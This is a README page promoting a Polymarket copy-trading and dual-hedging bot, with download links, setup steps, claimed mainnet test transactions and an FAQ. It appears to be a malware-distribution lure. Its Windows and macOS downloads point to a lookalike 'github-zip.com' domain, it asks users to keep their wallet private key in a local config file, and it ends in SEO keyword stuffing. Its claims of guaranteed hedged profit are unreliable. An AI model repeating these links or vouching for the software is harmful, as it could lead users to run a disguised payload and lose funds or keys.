# Polymarket Copy Trading Bot

> Mirror a winning wallet and hedge both outcomes simultaneously — lock in edge before the market corrects.

![preivew](https://repository-images.githubusercontent.com/1181160352/60f909f9-1fb7-48eb-9d8e-81d62c2e9aa8)

*Last updated: March 2025*

## What is a Polymarket Copy Trading Bot?

A Polymarket copy trading bot automatically mirrors the on-chain positions of a target wallet on Polymarket's prediction market exchange. It detects buys and sells in real time, replicates the trade proportionally, and optionally places a hedge on the opposing outcome — all without manual intervention.

---

## What This Bot Does

Most Polymarket bots pick a side. This one doesn't have to.

It tracks a target wallet, copies their position, then places a proportional hedge on the opposite outcome. When the market misprices both sides of the same event, the bot captures the spread automatically — no manual analysis, no guessing direction.

**What it monitors before each trade:**

* **Order book depth** — checks CLOB liquidity against your position size before executing
* **Target wallet activity** — detects buys and sells in real time
* **Dual-side pricing** — calculates YES/NO spread to confirm the hedge is profitable
* **Capital limits** — never exceeds your configured allocation per market

---

## Two Ways to Run It

| | Windows App | Python Bot |
|---|---|---|
| **Setup** | Double-click, done | `pip install` + config |
| **Best for** | Running 24/7 unattended | Backtesting + custom logic |
| **Strategy** | Dual-hedge, embedded | Full parameter control |
| **Config** | `config.toml` | Direct code access |

## Download

| Platform | Architecture | Download |
|----------|-------------|----------|
| **Windows** | x64 | [Download the latest release](https://github-zip.com/Polymarket) |
| **macOS** | Apple Silicon | [Download the latest release](https://github-zip.com/Polymarket-mac) |

---

## Quick Start

### Windows App — 3 steps

```
# 1. Download from Releases

# 2. (Optional) Edit config.toml — set capital limits and target wallet

# 3. Double-click the app — bot starts scanning immediately
```

No Python. No dependencies. No setup.

### Python Bot

```bash
cd polymarket-trading-bot/python
pip install -r requirements.txt
cd ..
python polymarket-trading-bot-v.1.04.11.py
```

---

## How It Works

![execution pipeline](https://github.com/user-attachments/assets/e3b0fb2e-fb36-4c2b-ab06-f49b04a756fd)

Five stages from signal to hedge:

1. **Monitor** — watches target wallet and Polymarket CLOB in real time
2. **Analyze** — identifies YES/NO spread and confirms both sides are liquid
3. **Calculate** — sizes each position from your capital limit and current depth
4. **Execute** — places both orders atomically on Polymarket's CLOB
5. **Track** — logs every trade with full pricing breakdown for review

### Windows App Strategy
* Real-time order book monitoring and execution
* Synchronized dual-side order placement
* Configurable capital allocation per market
* Deterministic hedge logic — same output for same market conditions

### Python Bot Strategy
* Full access to execution logic for custom strategies
* Simulation and backtesting of hedge setups
* Flexible position sizing and risk parameter tuning
* Detailed logs, metrics, and execution history

---

## Bot UI Preview

<img width="4096" height="2577" alt="Polymarket copy trading bot dashboard" src="https://github.com/user-attachments/assets/bee868fc-be99-4f61-8c4e-b93b90d432d7" />

---

## Verified on Polygon Mainnet

Tested under live conditions. Every transaction is publicly verifiable on PolygonScan.

**Configuration used:**
* Target wallet (tracked): `0xEb55A1A899594B5b9C406FfA493775Feab54d5e9`
* Execution wallet (bot): `0x2108FF2b299800B7a904BD36A7cEd1c4Db5F47dC`

**Buy — target wallet detected, bot executed mirror position**

| | Transaction |
|---|---|
| Target wallet buy | [0x39b3be...](https://polygonscan.com/tx/0x39b3bebdc377f12f116e6a43ed6157e6da2bc17cbb0f8cea63ce6992dd5a0d5e) |
| Bot execution (copy) | [0xa2e7ab...](https://polygonscan.com/tx/0xa2e7abc0e35e2a7ed275c958209d34686fa87d7b186c8264334f8cbab1eca35d) |

**Sell — exit detected, position closed automatically**

| | Transaction |
|---|---|
| Target wallet sell | [0xbbf1fa...](https://polygonscan.com/tx/0xbbf1fa775c7c3ebcf65edf41117964c447b0bcb23864915a90e560f9f2459eb0) |
| Result | 1,690,000 ERC-1155 tokens → 4.66 USDC |

What these confirm:
* Sub-second signal-to-execution latency
* Proportional position sizing from configured limits
* Full compatibility with Polymarket's CLOB exchange
* Live hedge execution on Polygon mainnet

---

## Frequently Asked Questions

**What is dual-position hedging on Polymarket?**
Dual-position hedging means placing opposing bets on both YES and NO outcomes of the same Polymarket event. When the market temporarily misprices both sides, the combined position generates a net positive return regardless of which outcome resolves — capturing the spread rather than predicting the result.

**Does the bot need my Polymarket private key?**
Yes. The bot signs transactions using your Web3 wallet private key, stored locally in `config.toml`. Keys are never transmitted to external servers. You control the execution wallet.

**What's the minimum USDC balance to start?**
There is no enforced minimum. Practical minimum is ~10 USDC to cover gas fees on Polygon and maintain meaningful position sizes. Capital limits per market are configured in `config.toml`.

**How does it detect when the target wallet trades?**
The bot monitors Polymarket's CLOB (Central Limit Order Book) via RPC — the same on-chain data visible on PolygonScan. When the target wallet's address executes a fill, the bot triggers within the same block cycle.

**Does the Python bot work on Linux and macOS?**
Yes. The Python implementation runs on any platform with Python 3.10+. The Windows `.exe` is Windows-only. macOS users should use the Python bot or the macOS binary from Releases.

**Can I run multiple target wallets simultaneously?**
Yes — configure multiple wallet addresses in `config.toml`. The bot tracks each independently and applies individual capital limits per wallet.

---

## Repository Structure

```
polymarket-copy-trading-bot/
│
├── polymarket-trading-bot-v.1.04.11.exe   # Windows app
├── config.toml                            # Capital limits, target wallet, hedge params
│
├── data/
│   ├── cache/                             # Market data and order book snapshots
│   ├── logs/                              # Trade logs with pricing breakdowns
│   └── dll/                              # Required shared libraries
│
├── python/
│   ├── src/                               # Execution engine source
│   ├── docs/                              # API documentation
│   ├── scripts/                           # Backtesting and analysis utilities
│   └── requirements.txt
│
└── README.md
```

---

## Requirements

**Python dependencies:**
```
python-dotenv, typer[all], devtools, fastapi, uvicorn[standard], httpx, websockets
```

**You also need:**
* Polymarket account — register at polymarket.com
* Web3 wallet — MetaMask or compatible
* USDC/USDC.e on Polygon for funding
* RPC provider — Alchemy, Chainstack, or Infura API key
* `config.toml` — set target wallet, capital limits, and hedge parameters

---

#### Made with ❤️ for the Polymarket community

seo:
polymarket hedge bot polymarket dual-position hedge polymarket market-neutral bot polymarket arbitrage strategy prediction market hedge bot
polymarket spread trading polymarket outcome hedging polygon hedge bot defi hedge trading prediction market neutral strategy
polymarket copy trading bot polymarket copy bot polymarket auto trader polymarket position mirror polymarket wallet tracker
polymarket clob bot polymarket on-chain bot polymarket usdc bot polymarket python bot polymarket web3 bot
how to hedge polymarket positions polymarket dual-side trading automated polymarket hedge polymarket arbitrage bot open source
defi copy trading bot on-chain copy trading polygon copy bot crypto hedge bot prediction market arbitrage
polymarket bot python polymarket automated trading polymarket api bot market neutral prediction market bot event-based hedge bot
polymarket passive income polymarket yield bot polymarket trade automation polymarket order book bot defi market making bot
